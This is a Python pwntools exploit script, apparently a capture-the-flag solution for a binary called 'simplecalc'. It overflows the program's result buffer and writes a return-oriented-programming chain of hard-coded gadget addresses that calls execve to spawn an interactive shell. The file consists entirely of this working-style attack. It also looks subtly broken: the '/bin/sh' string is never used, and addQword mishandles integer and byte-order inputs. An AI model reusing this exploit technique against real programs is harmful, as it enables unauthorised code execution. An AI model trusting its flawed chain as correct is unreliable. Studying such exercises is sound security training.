#!/usr/bin/env python3
from pwn import *

context.terminal = ["alacritty", "-e", "bash", "-c"] 
pr = pwnlib.gdb.debug("./simplecalc", )

def addDoubleWord(x):
    pr.sendline(b"1")
    pr.sendline(b"100")
    print(b"SENT " + str(x - 100).encode())
    pr.sendline(str(x - 100).encode())

def addQword(num):
    z = int.from_bytes(num, "big")
    x = z & 0xffffffff
    y = ((z & 0xffffffff00000000) >> 32)
    addDoubleWord(x)
    addDoubleWord(y)

execve_systemCall_number = 59
program_name = b"/bin/sh\x00"

pop_rax_gadget = 0x44db34
pop_rdi_gadget = 0x401b73
pop_rsi_gadget = 0x401c87
pop_rdx_gadget = 0x437a85
syscall_gadget = 0x400488

pr.sendline(b"100") # Number of operations

# Padding to the ret addr
# Note: We use 0x00 so the free() function doesn't complain
for i in range(9):
    addQword(0)

addQword(p64(pop_rax_gadget))
addQword(int.to_bytes(execve_systemCall_number, 8, "little"))
addQword(p64(pop_rdi_gadget))
addQword(p64(0x00))
addQword(p64(pop_rsi_gadget))
addQword(p64(0x00))
addQword(p64(pop_rdx_gadget))
addQword(p64(0x00))
addQword(p64(syscall_gadget))

pr.sendline(b"5")

pr.interactive()
